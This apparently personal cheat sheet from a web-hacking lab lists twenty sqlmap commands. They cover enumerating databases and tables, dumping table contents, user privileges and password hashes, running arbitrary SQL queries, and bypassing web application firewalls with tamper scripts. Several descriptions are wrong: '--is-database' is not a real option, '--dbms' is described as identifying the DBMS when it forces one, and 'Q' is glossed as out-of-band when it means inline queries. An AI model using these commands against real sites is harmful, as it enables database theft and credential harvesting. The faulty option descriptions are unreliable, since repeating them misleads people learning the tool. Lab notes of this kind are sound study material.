# SQLMap Commands Documentation

A concise list of SQLMap commands used, along with a brief description for each:

---

1. **List Databases**
    ```bash
    sqlmap -r req4.txt --dbs
    ```
    - Enumerates all databases in the target system.

2. **List Tables**
    ```bash
    sqlmap -r req4.txt -D peh-labs --tables
    ```
    - Lists all tables in a specific database.

3. **List Columns**
    ```bash
    sqlmap -r req4.txt -D peh-labs -T injection0x03_products --columns
    ```
    - Lists all columns in a specific table.

4. **Dump Data**
    ```bash
    sqlmap -r req4.txt -D peh-labs -T injection0x03_products -C product_name --dump
    ```
    - Extracts the data of specific columns from a table.

5. **Dump All Data from a Table**
    ```bash
    sqlmap -r req4.txt -D peh-labs -T injection0x03_products --dump
    ```
    - Extracts all data from a specific table.

6. **Retrieve Banner**
    ```bash
    sqlmap -r req4.txt --banner
    ```
    - Retrieves the database banner (version information).

7. **Identify DBMS**
    ```bash
    sqlmap -r req4.txt --dbms
    ```
    - Identifies the type of database management system (DBMS).

8. **Check for SQL Injection Vulnerability**
    ```bash
    sqlmap -r req4.txt --is-database
    ```
    - Checks if the target URL is vulnerable to SQL injection.

9. **Get Users**
    ```bash
    sqlmap -r req4.txt --users
    ```
    - Retrieves a list of database users.

10. **Get User Privileges**
    ```bash
    sqlmap -r req4.txt --privileges
    ```
    - Retrieves the privileges of database users.

11. **Get Passwords**
    ```bash
    sqlmap -r req4.txt --passwords
    ```
    - Retrieves the hashed passwords of database users.

12. **Enumerate Schema**
    ```bash
    sqlmap -r req4.txt --schema
    ```
    - Enumerates the database schema.

13. **Search for Specific Data**
    ```bash
    sqlmap -r req4.txt --search "keyword"
    ```
    - Searches for specific data in the database.

14. **List All Databases and Tables**
    ```bash
    sqlmap -r req4.txt --tables --all-databases
    ```
    - Lists all databases and their tables.

15. **Check Injection Point**
    ```bash
    sqlmap -r req4.txt --risk=3 --level=5
    ```
    - Checks for SQL injection points with higher risk and level.

16. **Bypass WAF/Filters**
    ```bash
    sqlmap -r req4.txt --tamper=space2comment
    ```
    - Attempts to bypass web application firewalls (WAFs) or filters using tampering techniques.

17. **Run SQL Queries**
    ```bash
    sqlmap -r req4.txt --sql-query "SELECT * FROM users"
    ```
    - Executes custom SQL queries on the database.

18. **Set Maximum Number of Concurrent Requests**
    ```bash
    sqlmap -r req4.txt --threads=10
    ```
    - Sets the number of concurrent requests to increase performance.

19. **Save Output to File**
    ```bash
    sqlmap -r req4.txt --output-dir=/path/to/save
    ```
    - Saves the output to a specified directory.

20. **Check for All Supported SQL Injection Techniques**
    ```bash
    sqlmap -r req4.txt --technique=BEUSTQ
    ```
    - Checks for all supported SQL injection techniques (Boolean-based, Error-based, Union-based, Stacked queries, Time-based, and Out-of-band).

